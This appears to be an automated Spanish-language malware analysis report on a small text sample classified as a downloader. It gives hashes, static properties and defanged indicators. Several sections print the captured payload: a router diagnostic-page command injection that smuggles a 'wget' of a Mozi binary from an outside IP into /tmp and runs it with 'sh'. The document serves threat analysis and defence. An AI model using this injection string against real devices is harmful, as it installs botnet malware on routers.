# 🧬 Payload Analysis

`ddd990d13f6a37a6bce8d03ef12e5a2ca5c6267a2a3c7f551584ff1bf5a98616`

## 📌 Resumen

Texto ASCII de 319 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `Mozi.m+-O+-` en `hxxp://139.135.40.XXX:59501/Mozi.m+-O+-`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget hxxp://139.135.40.XXX:59501/Mozi.m -O ->/tmp/gpon80`
2. `sh` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/ddd990d13f6a37a6bce8d03ef12e5a2ca5c6267a2a3c7f551584ff1bf5a98616.md](../../../../../malware-like/oraculo/downloader/ddd990d13f6a37a6bce8d03ef12e5a2ca5c6267a2a3c7f551584ff1bf5a98616.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:36:21.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ddd990d13f6a37a6bce8d03ef12e5a2ca5c6267a2a3c7f551584ff1bf5a98616`
- **SHA1:** `0e0e7a3e26bb1d8c9502c2f5e1fb96d594df3910`
- **MD5:** `7179c61ce8d039f9e410514b8f6f61a3`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 319 B |
| Entropía | 5.44 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://139.135.40.XXX:59501/Mozi.m+-O+->/tmp/gpon80;sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://139.135.40.XXX:59501/Mozi.m+-O+- | strings |
| ip | 139.135.40.XXX | static_analysis |
| command | XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://139.135.40.XXX:59501/Mozi.m+-O+->/tmp/gpon80;sh | strings |
| hash | ddd990d13f6a37a6bce8d03ef12e5a2ca5c6267a2a3c7f551584ff1bf5a98616 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
